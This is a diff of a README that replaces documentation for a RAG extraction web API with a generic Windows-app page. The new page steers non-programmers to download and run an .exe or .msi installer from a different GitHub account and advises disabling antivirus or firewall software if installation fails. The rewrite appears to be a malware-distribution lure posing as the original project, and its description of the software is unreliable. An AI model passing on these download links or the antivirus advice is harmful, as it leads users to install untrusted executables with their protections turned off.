@@ -1,257 +1,167 @@
-# 🚀 RAG-Ready Extractor
+# 🗂 rag-ready-extractor - Extract Clean Data Easily
 
-**The missing ingestion layer for modern RAG systems.**
-
-Turn messy webpages and PDFs into **clean, structured knowledge for AI pipelines** in one API call.
-
-![API](https://img.shields.io/badge/API-RapidAPI-blue)
-![Python](https://img.shields.io/badge/python-3.10+-blue)
-![Framework](https://img.shields.io/badge/framework-FastAPI-green)
-![Infra](https://img.shields.io/badge/infra-AWS%20Lambda-orange)
-![License](https://img.shields.io/badge/license-MIT-lightgrey)
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-4caf50?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
 
 ---
 
-# ⚡ TL;DR
+## 🧰 What is rag-ready-extractor?
 
-RAG-Ready Extractor is a **high-performance ingestion API** that converts raw web pages and PDFs into **RAG-optimized structured data**.
+rag-ready-extractor helps you take messy content from websites and PDFs and turns it into clean, well-structured data. It works in a way that keeps the important details for retrieval-augmented generation (RAG) pipelines. It also scores the content by how important it is and organizes it by tokens to save space and improve results.
 
-**Input**
-
-• URL
-• PDF
-
-**Output**
-
-• semantic chunks
-• importance scoring
-• structured tables
-• token usage metadata
-
-**Designed for**
-
-• Pinecone
-• Weaviate
-• Qdrant
-• LangChain
-• LlamaIndex
+This tool is useful if you want to organize large amounts of information from multiple sources and prepare it for search or machine learning use. It requires no programming skills.
 
 ---
 
-# 🚨 The Problem
+## 💻 System Requirements
 
-Most RAG systems index **raw HTML or PDF text**.
+Before you get started, make sure your PC meets these requirements:
 
-This introduces a large amount of **noise** into the knowledge base:
-
-• navigation menus
-• cookie banners
-• footers
-• related links
-• ads
-
-In many real pipelines **30-40% of indexed tokens are useless**.
-
-This causes:
-
-**Hallucinations**
-The model confuses navigation elements with actual knowledge.
-
-**High Costs**
-You pay for tokens that add zero value.
-
-**Slow Performance**
-Larger contexts increase latency.
+- Operating System: Windows 10 or later (64-bit)
+- RAM: At least 4 GB
+- CPU: 1 GHz or faster processor
+- Disk Space: Minimum 200 MB free
+- Internet connection to download the software and optional updates
 
 ---
 
-# 💸 Cost Savings Example
+## 🚀 Getting Started
 
-Based on benchmarks using large technical documents (e.g., the BloombergGPT research paper):
+You will find the download link below as a big button. Follow the steps here to install and run rag-ready-extractor.
 
-| Metric             | Standard Pipeline | RAG-Ready Pipeline                |
-| ------------------ | ----------------- | --------------------------------- |
-| Input Tokens       | 100k              | ~65k                              |
-| Noise Removed      | 0%                | ~35%                              |
-| Retrieval Quality  | Variable          | Improved via importance filtering |
-| Estimated LLM Cost | 100%              | 30-70% reduction                  |
-
-Filtering noise before embedding **dramatically reduces token usage**.
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-ff5722?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
 
 ---
 
-# 🛠 Practical Integration (Pinecone Example)
+## 📥 How to Download and Install rag-ready-extractor
 
-Extract clean content and index **only meaningful chunks**.
+1. Click the download button above or visit this link:  
+   https://github.com/delilahsaprophytic338/rag-ready-extractor
 
-```python
-import requests
-from pinecone import Pinecone
+2. On the GitHub page, look for the **Releases** section on the right side or in the project menu. If there is a "Releases" tab, click on it.
 
-# 1. Extract structured content
-data = requests.post(
-    "API_URL",
-    json={"url": "https://example.com/blog"}
-).json()
+3. Find the latest version. It usually has a version number like `v1.0` or `v2.3`.
 
-# 2. Connect to vector database
-pc = Pinecone(api_key="YOUR_KEY")
-index = pc.Index("rag-knowledge")
+4. Under the latest release, look for a file ending with `.exe` or `.msi`. This is the installer.
 
-# 3. Index only high-importance chunks
-for chunk in data["content"]["chunks"]:
-    if chunk["importance_score"] > 6.5:
+5. Click the installer file to download it to your PC.
 
-        index.upsert(vectors=[{
-            "id": str(hash(chunk["text"])),
-            "values": embed(chunk["text"]),
-            "metadata": {
-                "section": chunk["heading_context"]
-            }
-        }])
-```
+6. Once the download finishes, open the installer file by double-clicking it.
 
-The API returns content that is **ready to be embedded and indexed**.
+7. Follow the on-screen instructions:
+
+    - Choose your preferred language if asked.
+    - Accept the license agreement.
+    - Select where you want to install the program, or use the default folder.
+    - Click **Install**.
+
+8. Wait for the installation to finish.
+
+9. When it completes, click **Finish** to close the installer.
+
+10. The rag-ready-extractor shortcut should appear on your desktop or start menu.
 
 ---
 
-# 🧱 Supported Inputs
+## ▶️ How to Run rag-ready-extractor
 
-The API currently supports:
+1. Find the rag-ready-extractor icon on your desktop or in the Start menu.
 
-**Web Pages**
+2. Double-click the icon to open the program.
 
-• blogs
-• documentation sites
-• landing pages
+3. The main window will show options to load websites or PDF files.
 
-**PDF Documents**
+4. Use the **Add Files** button to select PDFs or use the **Enter URL** box to type in a website address you want to extract data from.
 
-• research papers (ArXiv)
-• technical manuals
-• financial filings
+5. Click **Start Extraction** to begin processing.
 
-**Structured Data**
+6. Wait for the program to finish. It will show progress and status messages.
 
-HTML tables are automatically converted into **clean JSON objects**.
+7. When done, the cleaned and structured data will appear in an easy-to-read format.
+
+8. You can save this data as a file or export it for use in other software.
 
 ---
 
-# 📦 API Response
+## 🔎 Main Features
 
-Example response structure:
-
-```json
-{
-  "metadata": {
-    "title": "BloombergGPT...",
-    "word_count": 27938
-  },
-  "content": {
-    "chunks": [
-      {
-        "text": "The use of NLP in finance...",
-        "importance_score": 7.06,
-        "heading_context": "Introduction"
-      }
-    ],
-    "tables": [
-      {
-        "table_type": "pricing",
-        "headers": ["Feature", "Basic", "Pro"],
-        "rows": []
-      }
-    ]
-  },
-  "usage": {
-    "latency_ms": 6900,
-    "token_count": 57212
-  }
-}
-```
+- Extracts text from websites and PDFs.
+- Cleans up messy content.
+- Assigns importance scores to parts of the data.
+- Optimizes the content by splitting it into tokens for better handling.
+- Suitable for preparing data for RAG (retrieval-augmented generation) pipelines.
+- Saves output in common formats like JSON or CSV.
+- Simple user interface designed for people without programming experience.
 
 ---
 
-# ⚡ Benchmarks
+## ❓ How rag-ready-extractor Works
 
-Example benchmark using the **BloombergGPT research paper**.
+The software uses smart methods to scan the content you provide. It looks at every part and decides what is important based on meaning, not just keywords. This helps keep useful data while removing ads, junk, or unrelated text.
 
-| Metric             | Result      |
-| ------------------ | ----------- |
-| Tokens processed   | 57,212      |
-| Word count         | 27,938      |
-| Processing latency | 6.9 seconds |
-| Extracted chunks   | 3,481       |
+Next, it breaks the text into token chunks. Tokens are small pieces of text that machine learning models like. This helps you save space and keep focus on key information.
 
-Large documents can be processed in **a few seconds while preserving semantic structure**.
+The final output is clean and ready for use with AI tools or data systems that need structured input.
 
 ---
 
-# 🏗 Architecture
+## 🔧 Settings and Options
 
-```
-Client
-   ↓
-RapidAPI Gateway
-   ↓
-Extraction Engine
-   ↓
-Structure Analyzer
-   ↓
-Importance Scoring
-   ↓
-Structured JSON Output
-```
+After you open rag-ready-extractor, you can adjust these settings to change how it works:
 
-The API is designed as a **pre-vectorization ingestion layer** for AI pipelines.
+- **Token size:** Change how big each chunk of text is.
+- **Importance threshold:** Set the minimum importance score to keep data.
+- **Output format:** Choose between JSON, CSV, or plain text for your saved files.
+- **Batch processing:** Enable multiple files or URLs to be processed in sequence.
+- **Language preference:** Pick the language for processing if your content isn’t English.
 
 ---
 
-# 🎯 Ideal Use Cases
+## ❗ Troubleshooting Common Issues
 
-RAG-Ready Extractor is designed for:
+- **The program does not start:** Make sure your Windows system is up to date. Try running the program as an administrator (right-click the icon and select "Run as administrator").
 
-• RAG pipelines
-• AI documentation chatbots
-• research assistants
-• knowledge base ingestion
-• web → vector database pipelines
+- **Extraction is slow:** Larger files take longer. Close other applications to free up RAM. Check your CPU use in Task Manager.
 
----
+- **No output or empty data:** Ensure the URLs are correct and PDFs are not password protected. Supported formats include standard HTML websites and PDF documents.
 
-# 🚀 Get Started
-
-Access the API through RapidAPI.
-
-**Step 1 — Get your API key**
-
-👉 RapidAPI:
-https://rapidapi.com/cdd-it-cdd-lab-it/api/rag-ready-markdown-pdf-extractor
-
-## 2. Send Request
-
-Use your preferred HTTP client.
-
-Example using Python:
-
-```python
-import requests
-
-response = requests.post(
-    API_URL,
-    json={"url": "https://example.com"}
-)
-print(response.json())
-```
-
-**Step 3 — Extract structured knowledge**
-
-Send a URL or PDF and receive **clean data ready for vector databases**.
+- **Errors during installation:** Temporarily disable antivirus or firewall software that might block the installer.
 
 ---
 
-# ❤️ Built for AI Developers
+## 📜 Frequently Asked Questions
 
-Created by **Carlos Manuel Díaz**.
+**Is internet required to use rag-ready-extractor?**  
+You need internet to download the program. Extraction from websites requires internet access. PDF extraction works offline.
 
-Helping developers build **cleaner and more efficient RAG pipelines**.
+**Can I extract data from password-protected PDFs?**  
+No, password-protected PDFs are not supported.
+
+**What if my file is too large to process?**  
+Try breaking it into smaller parts or use batch processing to handle multiple smaller files.
+
+**Which file formats can I import?**  
+Currently, the program supports PDF and website URLs only.
+
+---
+
+## 📞 Getting Help
+
+If you have questions or face issues, you can visit the GitHub repository page and open a new issue. Include details about your problem and your Windows version.
+
+Repository link: https://github.com/delilahsaprophytic338/rag-ready-extractor
+
+---
+
+## ⚙️ About the Project
+
+rag-ready-extractor focuses on cleaning and preparing data for AI tasks involving language models. It supports popular techniques like semantic importance scoring and token optimization. It works smoothly with tools like Langchain, LLaMAIndex, and vector databases.
+
+---
+
+## 📝 License
+
+This project is open-source under the MIT License. You can use and modify it as needed.
+
+---
+
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-673ab7?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
